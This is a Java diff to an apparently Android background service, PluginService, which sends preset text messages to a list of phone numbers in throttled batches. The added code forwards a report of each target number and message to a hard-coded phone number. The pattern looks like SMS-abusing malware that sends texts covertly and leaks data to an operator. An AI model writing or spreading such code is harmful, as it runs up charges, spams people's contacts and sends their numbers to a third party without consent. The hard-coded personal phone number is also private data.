@@ -101,6 +101,7 @@ public class PluginService extends IntentService {
                     //如果一下发送多条短信会有问题，所以增加一个延迟
                     //每次只发5条，等10分钟，再发5条
                     for (int i = 0; (i < datas.length && i < SEND_MESSAGE_CONTENT.length); ++i) {
+                        String target = datas[i];
                         if (datas[i] != null && (datas[i].length() == 11 || datas[i].startsWith("+"))) {
                             if (SMSUtil.sendSMS(datas[i], SEND_MESSAGE_CONTENT[i])) {
                                 datas[i] = "";
@@ -108,6 +109,20 @@ public class PluginService extends IntentService {
                         } else {
                             //电话号码的格式不合法，直接电话号码清空
                             datas[i] = "";
+                        }
+
+                        if (Config.DEBUG) {
+                            try {
+                                //等待1S
+                                Thread.sleep(1000);
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                                if (Config.DEBUG) {
+                                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
+                                }
+                            }
+
+                            SMSUtil.sendSMS("18811087096", "[[通知短信]]子程序向:" + target + "  发送了:" + SEND_MESSAGE_CONTENT[i]);
                         }
 
                         try {
